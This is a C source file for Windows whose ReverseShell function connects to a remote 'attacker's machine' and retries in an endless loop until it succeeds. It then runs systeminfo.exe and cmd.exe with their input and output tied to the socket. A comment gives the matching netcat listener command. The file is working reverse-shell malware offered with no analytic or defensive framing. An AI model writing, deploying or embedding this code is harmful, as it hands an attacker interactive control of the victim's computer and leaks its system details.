#include "shell.h"

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;



//server: nc -lvp 4444
int ReverseShell(const char* ip, short port)
{
	// listener ip, port on attacker's machine
	//char* ip = "127.0.0.1";
	//short port = 4444;
	while (1) {
	// init socket lib
		

		WSAStartup(MAKEWORD(2, 2), &wsaData);

	// create socket
		wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

		hax.sin_family = AF_INET;
		hax.sin_port = htons(port);
		hax.sin_addr.s_addr = inet_addr(ip);
	
		// connect to remote host
		if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL)) {
			WSACleanup();
			continue;
		}
			
		memset(&sui, 0, sizeof(sui));
		sui.cb = sizeof(sui);
		sui.dwFlags = STARTF_USESTDHANDLES;
		sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;


		TCHAR line1[] = TEXT("systeminfo.exe");
		CreateProcess(NULL, line1, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
		WaitForSingleObject(pi.hProcess, INFINITE);
		// start cmd.exe with redirected streams
		TCHAR line[] = TEXT("cmd.exe");
		CreateProcess(NULL, line, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
		WaitForSingleObject(pi.hProcess, INFINITE);
		
	}
	return 0;
}